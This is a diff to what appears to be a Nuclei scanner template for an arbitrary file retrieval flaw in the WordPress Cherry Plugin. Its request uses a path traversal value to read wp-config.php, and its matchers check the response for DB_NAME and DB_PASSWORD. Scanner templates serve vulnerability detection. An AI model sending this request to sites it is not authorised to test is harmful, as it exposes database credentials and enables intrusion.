@@ -1,5 +1,4 @@
 id: cherry-file-download
-
 info:
   name: Cherry Plugin < 1.2.7 - Arbitrary File Retrieval and File Upload
   author: 0x_Akoko
@@ -11,26 +10,22 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
     cvss-score: 8.6
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23,CWE-73
   metadata:
     max-request: 1
-  tags: wordpress,wp-plugin,lfi,wpscan,vuln
-
+  tags: lfi,vuln,wordpress,wp-plugin,wpscan
 http:
-  - method: GET
+  - matchers:
+      - condition: and
+        part: body
+        type: word
+        words:
+          - DB_NAME
+          - DB_PASSWORD
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "DB_NAME"
-          - "DB_PASSWORD"
-        part: body
-        condition: and
-
-      - type: status
-        status:
-          - 200
-
